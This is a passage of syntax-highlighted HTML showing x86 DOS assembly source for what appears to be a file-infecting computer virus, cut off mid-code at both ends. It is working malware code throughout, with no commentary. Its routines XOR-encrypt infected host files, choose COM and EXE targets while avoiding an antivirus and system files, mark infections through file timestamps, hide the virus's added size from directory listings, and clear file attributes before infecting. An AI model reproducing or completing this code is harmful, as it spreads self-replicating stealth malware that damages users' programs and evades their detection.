         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; CX:DX = offset from origin of ne...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">crypt_ptr</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; DX = file pointer to encrypted/d...</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">crypt_length</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; CX = length of encrypted/decrypt...</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">data_buffer</span><span class="sc0">  </span><span class="sc1">; DX = offset of data_buffer</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">encrypt_host</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Partial decrypt the infected file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">crypt_key</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; AL = encryption/decryption key</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">crypt_length</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; CX = length of encrypted/decrypt...</span><span class="sc0">
</span><span class="sc5">encrypt_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; AH = byte of infected file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; Encrypt byte of infected file</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">       </span><span class="sc1">; Add byte of infected file to enc...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; Add low-order byte of length of ...</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; Increase index register</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encrypt_loop</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">decrypt_host</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Partial decrypt the infected file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">crypt_key</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; AL = encryption/decryption key</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">crypt_length</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">decrypt_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; Decrypt byte of infected file</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Add byte of infected file to dec...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; Add low-order byte of length of ...</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; Increase index register</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrypt_loop</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">examine_file</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Examine filename and file extension</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; SI = offset of filename</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">
</span><span class="sc5">find_dot</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; End of filename?</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">tst_nam_exi</span><span class="sc0">     </span><span class="sc1">; Zero? Jump to tst_nam_exi</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">      </span><span class="sc1">; Dot?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_dot</span><span class="sc0">        </span><span class="sc1">; Not equal? Jump to find_dot</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = two bytes of filename</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1101111111011111b</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SE'</span><span class="sc0">         </span><span class="sc1">; Aidstest?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tst_nam_exi</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to tst_nam_exi</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'NA'</span><span class="sc0">         </span><span class="sc1">; COMMAND.COM?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tst_nam_exi</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to tst_nam_exi</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SD'</span><span class="sc0">         </span><span class="sc1">; CHKDSK.EXE?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tst_file_ext</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to tst_file_ext</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">chkdsk_stat</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">tst_file_ext</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = two bytes of file extension</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1101111111011111b</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'OC'</span><span class="sc0">         </span><span class="sc1">; COM executable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_exe</span><span class="sc0">        </span><span class="sc1">; Not equal? Jump to test_exe</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of file extension</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11011111b</span><span class="sc0">    </span><span class="sc1">; Upcase character</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc0">      </span><span class="sc1">; COM executable?</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">tst_nam_exit</span><span class="sc0">
</span><span class="sc5">test_exe</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'XE'</span><span class="sc0">         </span><span class="sc1">; EXE executable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tst_nam_exit</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to tst_nam_exit</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of file extension</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11011111b</span><span class="sc0">    </span><span class="sc1">; Upcase character</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc0">      </span><span class="sc1">; EXE executable?</span><span class="sc0">
</span><span class="sc5">tst_nam_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">tst_nam_exi</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Clear zero flag</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">tst_nam_exit</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">tst_infected</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Test if a file is infected</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00011111b</span><span class="sc0">    </span><span class="sc1">; AL = seconds of file time</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000001b</span><span class="sc0">    </span><span class="sc1">; Infected (2 seconds)?</span><span class="sc0">

         </span><span class="sc6">stc</span><span class="sc0">             </span><span class="sc1">; Set carry flag</span><span class="sc0">

         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">is_infected</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to is_infected</span><span class="sc0">

         </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">
</span><span class="sc5">is_infected</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">size_stealth</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Filesize stealth</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">  </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">filenam_addr</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; BX = offset of filename</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Zero SI</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc2">08h</span><span class="sc4">/</span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Store eight bytes</span><span class="sc0">
</span><span class="sc5">sto_nam_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; AX = two bytes of filename</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; SI = offset within filename</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; SI =   "  "   "</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">sto_nam_loop</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">dta_fcb_stat</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">; DTA stealth?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">sto_file_ext</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to sto_file_ext</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; SI = offset of file extension</span><span class="sc0">

         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; BX =   "    "   "       "</span><span class="sc0">
</span><span class="sc5">sto_file_ext</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc2">04h</span><span class="sc4">/</span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Store four bytes</span><span class="sc0">
</span><span class="sc5">sto_ext_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; AX = two bytes of file extension</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; SI = offset within file extension</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; SI =   "  "     "       "</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">sto_ext_loop</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filename</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">filesize_</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; Zero filesize_</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc1">; DX = offset of filename</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">examine_file</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">sub_filesize</span><span class="sc0">    </span><span class="sc1">; No error? Jump to sub_filesize</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d00h</span><span class="sc0">        </span><span class="sc1">; Open file (read)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_call</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">sub_filesize</span><span class="sc0">    </span><span class="sc1">; Error? Jump to sub_filesize</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; BX = file handle</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; CX:DX = offset from origin of ne...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">;   "   "   "     "     "    "    "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">        </span><span class="sc1">; Set current file position (EOF)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_call</span><span class="sc0">

         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; CX:DX = offset from origin of ne...</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">;   "   "   "     "     "    "    "</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">;   "   "   "     "     "    "    "</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">;   "   "   "     "     "    "    "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">        </span><span class="sc1">; Set current file position (SOF)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_call</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; Read two bytes</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">filesize_</span><span class="sc0">    </span><span class="sc1">; DX = offset of filesize_</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">      </span><span class="sc1">; Read from file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_call</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">      </span><span class="sc1">; Close file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_call</span><span class="sc0">
</span><span class="sc5">sub_filesize</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">  </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filesize_</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; AX = filesize_</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Subtract size of virus from file...</span><span class="sc0">
         </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
         </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">size_st_exit</span><span class="sc0">    </span><span class="sc1">; No error? Jump to size_st_exit</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Add size of virus from filesize</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">size_st_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">lod_file_inf</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Load file information</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Save DX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; SI = offset of filename</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">121ah</span><span class="sc0">        </span><span class="sc1">; Get file's drive</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; DL = drive number</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">36h</span><span class="sc0">      </span><span class="sc1">; Get free disk space</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; AX = number of free clusters, BX...</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; DX:AX = free space on drive in b...</span><span class="sc0">
         </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">;   "   "  "     "   "    "   "   "</span><span class="sc0">

         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Enough free space on drive in b...?</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">enough_free</span><span class="sc0">     </span><span class="sc1">; Not zero? Jump to enough_free</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2000h</span><span class="sc0">        </span><span class="sc1">; Enough free space on drive in b...?</span><span class="sc0">
</span><span class="sc5">enough_free</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Load DX from stack</span><span class="sc0">
         </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">get_file_att</span><span class="sc0">    </span><span class="sc1">; Above or equal? Jump to get_file_att</span><span class="sc0">
</span><span class="sc5">lod_fil_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">stc</span><span class="sc0">             </span><span class="sc1">; Set carry flag</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">get_file_att</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">        </span><span class="sc1">; Get file attributes</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">lod_fil_exit</span><span class="sc0">    </span><span class="sc1">; Error? Jump to lod_fil_exit</span><span class="sc0">

         </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00011100b</span><span class="sc0">    </span><span class="sc1">; System, volume label or directory?</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">lod_fil_exit</span><span class="sc0">    </span><span class="sc1">; Not zero? Jump to lod_fil_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_attr</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">   </span><span class="sc1">; Store new file attributes</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; CX = new file attributes</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">        </span><span class="sc1">; Set file attributes</span><span class="sc0">
